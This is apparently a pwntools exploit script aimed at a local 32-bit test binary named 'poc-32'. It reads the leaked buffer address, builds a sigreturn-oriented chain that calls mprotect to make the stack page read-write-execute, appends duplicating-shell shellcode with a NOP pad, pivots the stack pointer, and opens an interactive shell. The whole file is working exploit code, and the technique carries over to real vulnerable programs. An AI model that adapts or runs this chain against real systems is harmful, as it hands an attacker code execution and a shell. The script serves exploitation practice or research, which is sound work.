import os

from pwn import *

context.clear(arch="i386", kernel="amd64")
PAGE_SIZE = 4096

def main():
	pass
	## Base exploit
	## 

	e = ELF("poc-32")
	p = process("./poc-32")
	gdb.attach(p)


	pop_eax = e.symbols["set_eax"]
	pop_esp = e.symbols["set_stackptr"]
	int_80 = e.symbols["make_syscall"]

	p.recvuntil(b"uffer = ")
	buff_addr = int(p.recvline()[:-1], 16)
	base_addr = buff_addr & ~(PAGE_SIZE - 1)

	print("Buffer address: 0x%X" % buff_addr)
	print("Base address: 0x%X" % base_addr)


	shk = pack(pop_eax)
	shk += pack(constants.linux.i386.SYS_sigreturn)
	shk += pack(int_80)


	frame = SigreturnFrame()
	# start	len	protection
	frame.eax = constants.linux.i386.SYS_mprotect
	frame.ebx = base_addr			# start
	frame.ecx = PAGE_SIZE			# len
	frame.edx = constants.PROT_WRITE | constants.PROT_READ | constants.PROT_EXEC # prot

	frame.esp = buff_addr + len(shk) + len(frame)
	frame.ebp = base_addr
	frame.eip = int_80


	shk += bytes(frame)

	shk += pack(buff_addr + len(shk) + 4)

	shk += asm(shellcraft.i386.linux.dupsh())

	# shk += cyclic(0x200)

	shk += b"\x90" * (cyclic_find("dtaa") - 4)
	shk += pack(pop_esp)
	shk += pack(buff_addr)

	p.send(shk)
	p.interactive()



main()